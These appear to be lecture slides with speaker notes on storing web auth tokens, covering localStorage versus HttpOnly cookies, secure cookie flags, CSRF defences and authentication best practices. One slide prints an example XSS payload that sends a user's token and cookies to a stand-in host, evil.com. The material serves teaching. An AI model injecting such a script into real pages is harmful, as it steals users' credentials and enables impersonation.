Where to Store Auth Tokens?

The Three Client-Side Options

localStorage

localStorage.setItem(
  'token',
  'eyJhbG...'
);

// Read it back
localStorage.getItem('token');
  • ✓ Persists across tabs & sessions
  • ✓ 5-10 MB storage
  • ✗ Accessible to ANY JavaScript
  • ✗ XSS can steal tokens!

sessionStorage

sessionStorage.setItem(
  'token',
  'eyJhbG...'
);

// Cleared when tab closes
  • ✓ Cleared when tab closes
  • ✓ Per-tab isolation
  • ✗ Still accessible to JS
  • ✗ XSS can still steal tokens!

HttpOnly Cookies

// Set by server header:
Set-Cookie: token=eyJhbG...;
  HttpOnly; Secure; SameSite=Strict

// JS cannot access this!
  • ✓ JS cannot read or modify
  • ✓ Sent automatically with requests
  • ✓ XSS cannot steal the token!
  • ⚠ Vulnerable to CSRF (fixable)

Rule of thumb: HttpOnly cookies are the most secure for auth tokens. localStorage is convenient but XSS-vulnerable.

Speaker Notes: Walk through each option. localStorage: "Easy to use, but ANY JavaScript on the page can read it. Remember XSS? If an attacker injects one line of code, they run document.cookie or localStorage.getItem('token') and send your token to their server." sessionStorage: "Slightly better because it's cleared when the tab closes, but still readable by JS." HttpOnly cookies: "The server sets the cookie with the HttpOnly flag, which means JavaScript CANNOT access it. Even if XSS happens, the attacker can't read the cookie." DEMO: Open DevTools Application tab, show localStorage, sessionStorage, and Cookies sections. Show how localStorage values are readable but HttpOnly cookies are not accessible via document.cookie.

The XSS + localStorage Problem

One Line of Code Steals Your Token

The Attack

// If XSS exists on your page...
// Attacker injects this script:

fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: localStorage.getItem('token'),
    cookies: document.cookie
  })
})

// That's it. One request.
// Attacker now has your auth token
// and can impersonate you.

With HttpOnly Cookies

// Same XSS attack, but...

localStorage.getItem('token')
// Returns: null (nothing there)

document.cookie
// Returns: "" (HttpOnly cookies
// are invisible to JavaScript!)

// Attacker can still make requests
// FROM the page (session riding),
// but can't STEAL the token itself
// to use from another machine.

HttpOnly cookies are a damage limitation strategy. XSS is still bad, but the attacker can't exfiltrate the token.

Speaker Notes: Side-by-side comparison. "On the left, with localStorage, the attacker can grab your token and send it to their server. Now they can log in as you from THEIR computer, at any time, until the token expires." "On the right, with HttpOnly cookies, the token is invisible to JavaScript. The attacker can still do damage if they have XSS (they can make requests from the page), but they can't steal the token and use it from their own machine. This is 'damage limitation.'" Key teaching moment: "This is why we talked about defense in depth earlier. Prevent XSS first (React auto-escaping, CSP). But if XSS happens anyway, HttpOnly cookies limit the damage."
SET

Secure Cookie Flags

Three Flags That Make Cookies Safe

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly

JavaScript cannot access this cookie.

document.cookie won't show it. Protects against XSS token theft.

Prevents: XSS token theft

Secure

Only sent over HTTPS.

Won't be sent on HTTP connections, preventing interception on insecure networks.

Prevents: Network sniffing

SameSite

Controls cross-site sending.

  • Strict: Never sent cross-site
  • Lax: Sent on top-level navigations
  • None: Always sent (requires Secure)

Prevents: CSRF attacks

Use all three together: HttpOnly; Secure; SameSite=Lax is the recommended baseline.

Speaker Notes: Show the Set-Cookie header syntax. "These are three independent flags, and you should use all three." HttpOnly: "We just covered this — blocks JS access." Secure: "Remember Week 8 when we talked about HTTPS? The Secure flag means this cookie is ONLY sent over HTTPS. On plain HTTP, the browser won't include it, so even if someone intercepts traffic on coffee shop Wi-Fi, they won't get the cookie." SameSite: "This is the newest flag and it prevents CSRF attacks." Explain CSRF briefly: "An attacker's site tricks your browser into making a request to bank.com. Since your browser automatically sends cookies with requests to bank.com, the request carries your session. SameSite=Strict prevents this by not sending the cookie on cross-site requests." Lax is a good default — it allows the cookie on top-level navigations (clicking a link) but blocks it on cross-site form submissions and fetch requests.
CSRF

CSRF: Cross-Site Request Forgery

When Other Sites Make Requests As You

The Attack

1. You're logged into bank.com (cookie active)
↓
2. You visit evil.com (in another tab)
↓
3. evil.com has a hidden form that submits to bank.com/transfer
↓
4. Browser automatically sends your bank.com cookie
↓
5. Bank processes request as YOU

The Defenses

1. SameSite Cookies (Easiest)

SameSite=Lax or Strict prevents the cookie from being sent on cross-site requests. Modern default in Chrome.

2. CSRF Tokens

Server sends a random token with each page. Forms must include this token. Attacker can't guess it.

3. Check Origin/Referer Header

Server verifies the Origin header matches its own domain. Requests from evil.com show Origin: evil.com.

Speaker Notes: CSRF is the trade-off of using cookies. "Cookies are automatically sent with every request to their domain. That's convenient for auth, but it means OTHER sites can trigger requests that carry your cookies." Walk through the attack: "You're logged into your bank. You visit a malicious site. That site has a hidden form that submits to bank.com/transfer?to=attacker&amount=1000. Your browser sends the bank.com cookies automatically." Good news: "SameSite=Lax is now the DEFAULT in Chrome and most browsers, so CSRF is much less common than it used to be. But you should still understand it." For React SPAs: "If you're using fetch() with JSON APIs, CSRF is largely mitigated because: (1) SameSite cookies block cross-origin requests, (2) JSON Content-Type triggers CORS preflight, and (3) the Origin header is checked."
BEST

Authentication Best Practices

The Rules for Your Projects

Do

  • ✓ Use HttpOnly cookies for session tokens
  • ✓ Set Secure and SameSite flags
  • ✓ Use short expiration times
  • ✓ Implement token refresh mechanisms
  • ✓ Invalidate sessions on logout (server-side)
  • ✓ Use established auth libraries (NextAuth, Passport)

Don't

  • ✗ Store sensitive tokens in localStorage
  • ✗ Build your own auth system from scratch
  • ✗ Store passwords in frontend code
  • ✗ Use tokens that never expire
  • ✗ Forget to invalidate sessions on logout
  • ✗ Send tokens in URL query parameters

Golden Rule: Never roll your own auth. Use battle-tested libraries and services (Auth0, Firebase Auth, NextAuth.js, Supabase Auth).

Speaker Notes: "The single most important piece of advice: don't build authentication from scratch. It's one of the hardest things to get right in software." Walk through the Do list: "Use HttpOnly cookies. Set all the flags we discussed. Use short expiration times so even if a token leaks, it's only valid for a limited time." Walk through the Don't list: "Never store sensitive tokens in localStorage. Never put tokens in URLs (they show up in server logs, browser history, and the Referer header). And PLEASE don't try to build your own auth system for your final projects — use a library." Mention specific tools they might use: NextAuth.js (if using Next.js), Firebase Auth, Supabase Auth, Auth0.
